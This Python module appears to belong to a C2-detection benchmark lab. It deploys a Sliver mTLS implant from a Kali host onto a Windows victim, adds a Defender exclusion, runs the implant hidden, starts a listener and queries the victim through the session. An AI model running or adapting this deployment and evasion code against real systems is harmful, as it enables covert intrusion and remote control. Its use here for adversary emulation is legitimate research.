"""Sliver phase runners for bench_v4 AURORA-CHAIN-001.

These runners implement the same callable contract as the CALDERA phase runners
in runtime.py, but drive a Sliver mTLS implant instead of CALDERA abilities.
All Sliver server interactions go through SSH to Kali where sliver-py is installed.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import time
from datetime import datetime, timezone
from typing import Any, Callable, Mapping

from c2trace.bench_v3.caldera_client import agent_paw, find_control_agent
from c2trace.bench_v4.runtime import (
    CalderaBootstrapPhaseResult,
    CalderaScenarioPhaseResult,
    CalderaTargetCandidate,
    BenchV4RuntimeError,
    RuntimeCase,
    RuntimeValues,
    deterministic_runtime_source_id,
    verify_deployment_manifest,
)
from .runtime import find_driver_agent

__all__ = [
    "run_sliver_bootstrap_phase",
    "resolve_sliver_target_phase",
    "run_sliver_scenario_phase",
]

KALI_IP = os.environ.get("C2TRACE_KALI_IP", "192.168.21.132")
KALI_SSH = f"kali@{KALI_IP}"
SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=10"]
SLIVER_OPERATOR_CFG = "/tmp/c2trace-operator.cfg"
SLIVER_IMPLANT_SOURCE = os.environ.get(
    "C2TRACE_SLIVER_IMPLANT_SOURCE", "/tmp/aurora-gen-test.exe"
)


def _ssh_run_py(script: str, timeout: float = 120) -> str:
    """Run a Python script on Kali via SSH, return stdout."""
    b64 = base64.b64encode(script.encode("utf-8")).decode()
    cmd = ["ssh"] + SSH_OPTS + [KALI_SSH, f"echo {b64} | base64 -d | python3 -"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SSH python failed (rc={result.returncode}): {result.stderr}")
    return result.stdout


def _scp_implant_to_windows(victim_path: str) -> str:
    scp_cmd = ["scp"] + SSH_OPTS + [
        f"{KALI_SSH}:{SLIVER_IMPLANT_SOURCE}", victim_path,
    ]
    result = subprocess.run(scp_cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"SCP implant failed: {result.stderr}")
    return victim_path


def _add_defender_exclusion(path: str) -> None:
    ps = f"Add-MpPreference -ExclusionPath '{path}' -ErrorAction SilentlyContinue"
    subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=15)


def _execute_implant(path: str) -> int:
    ps = f"$p = Start-Process -FilePath '{path}' -PassThru -WindowStyle Hidden; Write-Output $p.Id"
    result = subprocess.run(
        ["powershell", "-Command", ps],
        capture_output=True, text=True, timeout=30,
    )
    if result.returncode != 0:
        raise BenchV4RuntimeError(f"implant execution failed: {result.stderr}")
    lines = [l.strip() for l in result.stdout.strip().splitlines() if l.strip()]
    if lines and lines[-1].isdigit():
        return int(lines[-1])
    raise BenchV4RuntimeError(f"could not parse implant PID from: {result.stdout}")


def _ensure_mtls_listener() -> None:
    script = (
        "import asyncio, json\n"
        "from sliver import SliverClient, SliverClientConfig\n"
        "async def main():\n"
        "    with open('/tmp/c2trace-operator.cfg') as f:\n"
        "        cfg = json.load(f)\n"
        "    config = SliverClientConfig(operator=cfg['operator'], token=cfg['token'], lhost=cfg['lhost'], lport=cfg['lport'], ca_certificate=cfg['ca_certificate'], private_key=cfg['private_key'], certificate=cfg['certificate'])\n"
        "    client = SliverClient(config)\n"
        "    await client.connect()\n"
        "    try:\n"
        "        await client.start_mtls_listener(host='" + KALI_IP + "', port=18446)\n"
        "        print('LISTENER_STARTED')\n"
        "    except Exception:\n"
        "        print('LISTENER_EXISTS')\n"
        "asyncio.run(main())\n"
    )
    _ssh_run_py(script)


def _find_sliver_session(target_path: str, run_id: str, timeout: float = 120, poll: float = 3.0) -> dict:
    """Find the Sliver session matching the run_id via SSH to Kali."""
    script = (
        "import asyncio, json\n"
        "from sliver import SliverClient, SliverClientConfig\n"
        "from google.protobuf.json_format import MessageToDict\n"
        "async def main():\n"
        "    with open('/tmp/c2trace-operator.cfg') as f:\n"
        "        cfg = json.load(f)\n"
        "    config = SliverClientConfig(operator=cfg['operator'], token=cfg['token'], lhost=cfg['lhost'], lport=cfg['lport'], ca_certificate=cfg['ca_certificate'], private_key=cfg['private_key'], certificate=cfg['certificate'])\n"
        "    client = SliverClient(config)\n"
        "    await client.connect()\n"
        "    sessions = await client.sessions()\n"
        "    for s in sessions:\n"
        "        if s.Hostname == 'DESKTOP-G9IIQ2P' and '" + run_id + "' in (s.Filename or ''):\n"
        "            d = MessageToDict(s)\n"
        "            print(json.dumps(d))\n"
        "            return\n"
        "    print('NOT_FOUND')\n"
        "asyncio.run(main())\n"
    )
    deadline = time.time() + timeout
    while time.time() < deadline:
        out = _ssh_run_py(script, timeout=30)
        out = out.strip()
        if out and out != "NOT_FOUND":
            try:
                return json.loads(out)
            except json.JSONDecodeError:
                pass
        time.sleep(poll)
    raise BenchV4RuntimeError("Sliver session not found within timeout")


def _issue_get_env(session_id: str, var_name: str = "USERNAME") -> dict:
    script = (
        "import asyncio, json\n"
        "from sliver import SliverClient, SliverClientConfig\n"
        "from google.protobuf.json_format import MessageToDict\n"
        "async def main():\n"
        "    with open('/tmp/c2trace-operator.cfg') as f:\n"
        "        cfg = json.load(f)\n"
        "    config = SliverClientConfig(operator=cfg['operator'], token=cfg['token'], lhost=cfg['lhost'], lport=cfg['lport'], ca_certificate=cfg['ca_certificate'], private_key=cfg['private_key'], certificate=cfg['certificate'])\n"
        "    client = SliverClient(config)\n"
        "    await client.connect()\n"
        "    interactive = await client.interact_session('" + session_id + "')\n"
        "    if interactive is None:\n"
        "        print(json.dumps({'error': 'no interactive session'}))\n"
        "        return\n"
        "    env = await interactive.get_env('" + var_name + "')\n"
        "    d = MessageToDict(env)\n"
        "    print(json.dumps(d))\n"
        "asyncio.run(main())\n"
    )
    out = _ssh_run_py(script, timeout=60)
    try:
        return json.loads(out.strip())
    except json.JSONDecodeError:
        return {"raw": out.strip()}


def _synthetic_operation(run_id: str, role: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}",
        "name": f"AURORA-CHAIN-001 {role} ({run_id})",
        "state": "finished",
        "platform": "windows" if role == "bootstrap" else "linux",
    }


def _synthetic_link(run_id: str, role: str, ability_id: str) -> dict[str, Any]:
    return {
        "id": f"synthetic-{run_id}-{role}-link",
        "ability": {"ability_id": ability_id},
        "status": 0,
        "command": "sliver_implant" if role == "bootstrap" else "sliver_get_env",
        "host": "DESKTOP-G9IIQ2P",
        "pid": None,
    }


def run_sliver_bootstrap_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaBootstrapPhaseResult:
    """Deploy one Sliver mTLS implant and return a synthetic Bootstrap result."""
    if event_sink:
        event_sink("sliver_bootstrap_start", {"run_id": values.run_id})

    agents = [dict(a) for a in client.agents() if isinstance(a, Mapping)]
    control = find_control_agent(agents)
    scenario = runtime.operation("scenario")
    driver = find_driver_agent(agents) if scenario["execution_agent_role"] == "driver" else None
    baseline_paws = tuple(sorted({agent_paw(a) for a in agents if agent_paw(a)}))
    started = datetime.now(timezone.utc)
    verified = verify_deployment_manifest(runtime)
    template_id = str(runtime.operation_plan["runtime_source"]["id_template"])
    runtime_source_id = deterministic_runtime_source_id(template_id, values.run_id)

    # Ensure mTLS listener is running on Kali
    _ensure_mtls_listener()

    # Copy implant from Kali to Windows victim
    implant_path = values.target_path
    _scp_implant_to_windows(implant_path)
    _add_defender_exclusion(implant_path)
    _execute_implant(implant_path)

    # Wait for Sliver session to appear
    time.sleep(5)

    bootstrap_op = runtime.operation("bootstrap")
    bootstrap_ability_id = bootstrap_op["atomic_ordering"][0]
    bootstrap_link = _synthetic_link(values.run_id, "bootstrap", bootstrap_ability_id)

    if event_sink:
        event_sink("sliver_bootstrap_complete", {"implant_path": implant_path})

    return CalderaBootstrapPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=verified.manifest_sha256,
        runtime_source_id=runtime_source_id,
        install_receipt={"synthetic": True, "implant_path": implant_path},
        runtime_source={"id": runtime_source_id, "name": "c2trace_aurora_runtime_source"},
        control_agent=dict(control),
        driver_agent=dict(driver) if driver else None,
        baseline_paws=baseline_paws,
        started_at_utc=started,
        bootstrap_operation=_synthetic_operation(values.run_id, "bootstrap"),
        bootstrap_links=(bootstrap_link,),
        bootstrap_report={"state": "finished", "outcome": "implant_deployed"},
        bootstrap_event_logs=(),
    )


def resolve_sliver_target_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    *,
    timeout_seconds: float = 360.0,
    poll_seconds: float = 3.0,
) -> CalderaTargetCandidate:
    """Find the Sliver session for the deployed implant."""
    session_data = _find_sliver_session(
        values.target_path, values.run_id, timeout=timeout_seconds, poll=poll_seconds,
    )

    raw_identity = {
        "pid": session_data.get("PID"),
        "path": values.target_path,
        "host": session_data.get("Hostname", "DESKTOP-G9IIQ2P"),
        "session_id": session_data.get("ID"),
        "remote_address": session_data.get("RemoteAddress"),
    }

    return CalderaTargetCandidate(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        raw_identity=raw_identity,
        scenario_paw=agent_paw(bootstrap.control_agent),
    )


def run_sliver_scenario_phase(
    client: Any,
    runtime: RuntimeCase,
    values: RuntimeValues,
    bootstrap: CalderaBootstrapPhaseResult,
    candidate: CalderaTargetCandidate,
    frozen_identity: Mapping[str, Any],
    *,
    operation_timeout: float = 360.0,
    poll_seconds: float = 3.0,
    event_sink: Callable[[str, Mapping[str, Any]], None] | None = None,
    failure_artifact_sink: Callable[[Mapping[str, Any]], None] | None = None,
) -> CalderaScenarioPhaseResult:
    """Issue one GET_ENV via the Sliver session."""
    session_id = candidate.raw_identity["session_id"]
    if event_sink:
        event_sink("sliver_scenario_start", {"session_id": session_id})

    _issue_get_env(session_id, "USERNAME")

    scenario_op = runtime.operation("scenario")
    scenario_ability_id = scenario_op["atomic_ordering"][0]
    scenario_link = _synthetic_link(values.run_id, "scenario", scenario_ability_id)

    if event_sink:
        event_sink("sliver_scenario_complete", {"outcome": "get_env_completed"})

    return CalderaScenarioPhaseResult(
        case_id=runtime.case_id,
        run_id=values.run_id,
        deployment_manifest_sha256=bootstrap.deployment_manifest_sha256,
        runtime_source_id=bootstrap.runtime_source_id,
        target_identity=dict(frozen_identity),
        scenario_operation=_synthetic_operation(values.run_id, "scenario"),
        scenario_links=(scenario_link,),
        scenario_report={"state": "finished", "outcome": "get_env_completed"},
        scenario_event_logs=(),
    )
